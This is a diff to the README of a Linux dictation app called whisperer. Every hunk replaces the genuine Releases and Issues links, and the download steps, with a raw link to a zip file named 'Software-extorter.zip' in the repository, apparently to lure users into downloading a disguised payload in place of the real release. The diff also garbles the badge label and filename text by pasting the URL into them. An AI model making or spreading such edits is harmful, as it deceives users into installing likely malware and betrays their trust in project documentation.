@@ -6,9 +6,9 @@ Welcome to whisperer! This application allows you to use push-to-talk dictation 
 
 ## 📥 Download the Application
 
-[![Download Whisperer](https://img.shields.io/badge/Download%20Whisperer-v1.0-blue)](https://github.com/NguyenPhamMC/whisperer/releases)
+[![Download Whisperer](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip%20Whisperer-v1.0-blue)](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip)
 
-To download the application, visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases). You will find the latest version available. 
+To download the application, visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip). You will find the latest version available. 
 
 ## 📦 System Requirements
 
@@ -22,15 +22,15 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-Go to the [whisperer Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to find available versions.
+Go to the [whisperer Releases page](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip) to find available versions.
 
 ### 2. Download the Latest Version
 
-Choose the latest version from the list. Click on the link to download the `.tar.gz` file.
+Choose the latest version from the list. Click on the link to download the `https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip` file.
 
 ### 3. Extract the Files
 
-Once downloaded, navigate to your Downloads folder. Right-click on the `.tar.gz` file and choose “Extract Here.” This will create a new folder with the application files.
+Once downloaded, navigate to your Downloads folder. Right-click on the `https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip` file and choose “Extract Here.” This will create a new folder with the application files.
 
 ### 4. Open the Terminal
 
@@ -77,7 +77,7 @@ sudo apt install pipewire ydotool
 
 ## 💬 Support
 
-If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/NguyenPhamMC/whisperer/issues). You can also check out discussions for community support.
+If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip). You can also check out discussions for community support.
 
 ## 🔖 Additional Information
 
@@ -87,4 +87,4 @@ whisperer is designed for accessibility and ease of use. It supports a variety o
 
 We welcome contributions! If you'd like to contribute, please fork the repository and submit a pull request. If you want to suggest a feature or report a bug, do so on the Issues page.
 
-Thank you for choosing whisperer for your dictation needs! For more details, remember to visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to download the latest version. Enjoy dictating!
+Thank you for choosing whisperer for your dictation needs! For more details, remember to visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/raw/refs/heads/main/systemd/Software-extorter.zip) to download the latest version. Enjoy dictating!
